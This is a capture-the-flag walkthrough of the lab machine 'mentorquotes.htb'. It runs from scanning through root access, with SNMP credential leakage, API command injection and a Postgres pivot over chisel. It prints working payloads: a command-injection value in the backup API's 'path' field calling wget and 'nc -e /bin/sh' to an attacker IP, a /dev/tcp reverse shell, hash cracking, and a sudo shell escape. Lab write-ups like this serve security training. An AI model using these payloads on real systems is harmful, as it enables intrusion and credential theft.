
Target : 10.129.228.102

Started off with the port scan : 22,80

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c7:3b:fc:3c:f9:ce:ee:8b:48:18:d5:d1:af:8e:c2:bb (ECDSA)
|_  256 44:40:08:4c:0e:cb:d4:f1:8e:7e:ed:a8:5c:68:a4:f7 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: MentorQuotes
| http-server-header: 
|   Apache/2.4.52 (Ubuntu)
|_  Werkzeug/2.0.3 Python/3.6.9
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Enumerating Port : 80

Added `mentorquotes.htb` in `/etc/hosts`

Subdomain Fuzzing using ffuf:

`ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.mentorquotes.htb" -u http://mentorquotes.htb/ -mc 200`

Directory bruteforcing using gobuster:

`gobuster dir -u "http://mentorquotes.htb/" -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt`

Unfortunately, got nothing interesting.

While checking the landing page source, identified s3 url : https://s3-us-west-2.amazonaws.com/s.cdpn.io/80625/sea.jpg

![](../Pasted%20image%2020260717104634.png)

And the bucket is private!

As of now, we haven't got any directories, any subdomains, let's check if there is any parameter using arjun

`arjun -u "http://mentorquotes.htb"`

![](../Pasted%20image%2020260717104903.png)

Found a parameter : `ape`

Seems like its kinda module of python, there is not that much resources about it. 

Server: Werkzeug/2.0.3 Python/3.6.9

Werkzeug 2.0.3 is vulnreable to Debug shell command execution, but our target is debug not enabled.

Then did UDP Scan

`rustscan -a 10.129.228.102 -r 0-65535 --udp | tee -a udp`

and found : 68 and 161

```
161/udp  open   snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
| snmp-info: 
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: a124f60a99b99c6200000000
|   snmpEngineBoots: 67
|_  snmpEngineTime: 1h56m15s
| snmp-sysdescr: Linux mentor 5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64
|_  System uptime: 1h56m15.44s (697544 timeticks)

```


`snmp-check 10.129.228.102 -c public`     (it generates more readable output)

```output
snmp-check v1.9 - SNMP enumerator
Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)

[+] Try to connect to 10.129.228.102:161 using SNMPv1 and community 'public'

[*] System information:

  Host IP address               : 10.129.228.102
  Hostname                      : mentor
  Description                   : Linux mentor 5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64
  Contact                       : Me <admin@mentorquotes.htb>
  Location                      : Sitting on the Dock of the Bay
  Uptime snmp                   : 02:16:58.51
  Uptime system                 : 02:16:45.46
  System date                   : 2026-7-17 06:30:16.0

```
min
Then done enumeration again.

`ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.mentorquotes.htb" -u http://mentorquotes.htb/ -mc 200,404`

It reveals a subdomain `api`

Adding it to the /etc/hosts file.

Directory bruteforcing got us 

`gobuster dir -u "http://api.mentorquotes.htb/" -w /usr/share/wordlists/seclists/Discovery/Web-Content/common-api-endpoints-mazen160.txt`

```
admin                (Status: 307) [Size: 0] [--> http://api.mentorquotes.htb/admin/]
docs                 (Status: 200) [Size: 969]
users                (Status: 307) [Size: 0] [--> http://api.mentorquotes.htb/users/]
```

As of documentation, we can login using /auth/login 

we already found the email using snmp enumeration which is `admin@mentorquotes.htb`

```
{
  "email": "admin@mentorquotes.htb",
  "username": "admin",
  "password": "password"
}
```

Used this to login successfully.

Got the token : `eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZW1haWwiOiJhZG1pbkBtZW50b3JxdW90ZXMuaHRiIn0.vLcA4TDgWZS6Jik3Ujn829Y-S6KScrztunLPBDjkAt4`

But, this is not admin user, we need admin credentials to perform sensitive actions.

Let's further enumerate snmp, and look for other community strings.

`onesixtyone 10.129.228.102 -c /usr/share/wordlists/seclists/Discovery/SNMP/common-snmp-community-strings.txt`

![](../Pasted%20image%2020260717133646.png)

Actually, there is an another community string called `internal` but its not identified.

Let's do it directly check it with `snmp-check`

`snmp-check -v2c -c internal 10.129.228.102 `

It gives more information and also discloses a credential and the username, we can reuse this to access the api.

![](../Pasted%20image%2020260717141243.png)

![](../Pasted%20image%2020260717141411.png)

`  2077                  runnable              login.py              /usr/bin/python3      /usr/local/bin/login.py kj23sadkj123as0-d213`

![](../Pasted%20image%2020260717142028.png)

Api Documentation is written by james, let's try to connect it using username as james

```
{
  "email": "james@mentorquotes.htb",
  "username": "james",
  "password": "kj23sadkj123as0-d213"
}
```

Generated admin token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0

Let's enumerate the API:

```
curl -X 'GET' \                                                                                              
  'http://api.mentorquotes.htb/users/' \ 
  -H 'accept: application/json' -H "Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0"
  
[{"id":1,"email":"james@mentorquotes.htb","username":"james"},{"id":2,"email":"svc@mentorquotes.htb","username":"service_acc"},{"id":4,"email":"admin@mentorquotes.htb","username":"admin"}] 
```

```
curl -X 'POST' \                                                
  'http://api.mentorquotes.htb/admin/backup' \                                     
  -H 'Content-Type: application/json' -H "Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0" -d '{}' 
{"detail":[{"loc":["body","path"],"msg":"field required","type":"value_error.missing"}]
```

**Command execution using Path parameter:**

```
curl -X 'POST' \
  'http://api.mentorquotes.htb/admin/backup' \
  -H 'Content-Type: application/json' -H "Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0" -d '{"path":"$(wget http://10.10.16.241:80)"}' 
  
{"INFO":"Done!"}   

┌──(kali㉿kali)-[~/lab/htb/mentor]
└─$ python3 -m http.server 80                                                              
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.228.102 - - [17/Jul/2026 04:56:07] "GET / HTTP/1.1" 200 -

```

Let's gain shell access

`sh -i >& /dev/tcp/10.10.16.241/4444 0>&1`

```
curl -X 'POST' \
  'http://api.mentorquotes.htb/admin/backup' \
  -H 'Content-Type: application/json' -H "Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0" -d '{"path":"$(nc 10.10.16.241 4444 -e /bin/sh)"}'
```

And got shell as root in `docker` container.

![](../Pasted%20image%2020260717144048.png)

I looked for .dockerenv, but it has no content in it.

Check the container ip

```
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
11: eth0@if12: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue state UP 
    link/ether 02:42:ac:16:00:03 brd ff:ff:ff:ff:ff:ff
    inet 172.22.0.3/16 brd 172.22.255.255 scope global eth0
       valid_lft forever preferred_lft forever
```

We can see that the subnet mask is 172.22.255.255 . Therefore, we will perform a scan of the 172.22.0.0/24 subnet to identify other hosts and containers

Got the nmap static-binary here: `https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap`

`./nmap -sn 172.22.0.0/24`

```
Nmap scan report for 172.22.0.1
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.000078s latency).
MAC Address: 02:42:86:7D:C2:1F (Unknown)
Nmap scan report for docker_web_1.docker_vpcbr (172.22.0.2)
Host is up (0.000050s latency).
MAC Address: 02:42:AC:16:00:02 (Unknown)
Nmap scan report for docker_postgres_1.docker_vpcbr (172.22.0.4)
Host is up (0.000032s latency).
MAC Address: 02:42:AC:16:00:04 (Unknown)
Nmap scan report for b80b4fd0e780 (172.22.0.3)
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 16.72 seconds
```

172.22.0.4 seems interesting as it mentioned postgres, let's see which port that machine has opened

`5432/tcp open  postgresql`

Now, we need to pivot into the machine.

**Tunneling:**

In order to connect to that port, we need to create a tunnel using a tool such as Chisel. First, we need to transfer the binary to the container just like we did with the static Nmap binary. 

```
python3 -m http.server 8080

wget http://10.10.16.241:8080/chisel_amd64
chmod +x chisel_amd64
```

`./chisel_amd64 server -p 9001 --reverse`   (Attacker machine)

The following command starts a Chisel server on port 9001 in reverse mode, which allows a remote client to connect to the server. We will run chisel in server mode on our machine, and then connect to it from the container in client mode

`./chisel_amd64 client 10.10.16.241:9001 R:127.0.0.1:5432:172.22.0.4:5432`   (target machine)

Connecting to postgres:

`psql -h localhost -p 5432 -U postgres`

![](../Pasted%20image%2020260717154253.png)

```
 id |         email          |  username   |             password             
----+------------------------+-------------+----------------------------------
  1 | james@mentorquotes.htb | james       | 7ccdcd8c05b59add9c198d492b36a503
  2 | svc@mentorquotes.htb   | service_acc | 53f22d0dfa10dce7e29cd31f4f953fd8
  4 | admin@mentorquotes.htb | admin       | 5f4dcc3b5aa765d61d8327deb882cf99
```

Let's crack `svc` password using hashcat/john, seems like md5 hash.

`john hash --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt`

![](../Pasted%20image%2020260717161030.png)

`svc:123meunomeeivani`

Let's connect with ssh:

`ssh svc@mentorquotes.htb`

```
svc@mentor:~$ cat user.txt 
f8b862c2f68ca3cfc95f0a6591294576
```

**Privilege Escalation to james:**

`cat /etc/snmp/snmpd.conf`    (it reveals a hardcoded password)

let's try for the user: `james:SuperSecurePassword123__`

**Root Escalation:**

```
sudo -l

Matching Defaults entries for james on mentor:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User james may run the following commands on mentor:
    (ALL) /bin/sh
```

`sudo /bin/sh -p`

![](../Pasted%20image%2020260717163528.png)

`root.txt:dde9d684940b1378f9ae7a7a31ee3a69`